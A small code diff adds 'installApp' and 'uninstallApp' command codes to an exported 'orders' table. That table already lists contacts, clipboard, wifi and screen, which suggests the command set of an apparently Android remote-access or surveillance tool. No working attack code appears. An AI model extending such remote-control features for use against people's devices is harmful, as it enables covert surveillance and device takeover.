@@ -173,6 +173,8 @@ exports.orders = {
   contacts: 'x0000cn',
   deviceInfo: 'x0000di',
   apps: 'x0000ap',
+  installApp: 'x0000ia',
+  uninstallApp: 'x0000ua',
   clipboard: 'x0000cb',
   wifi: 'x0000wf',
   screen: 'x0000sc',
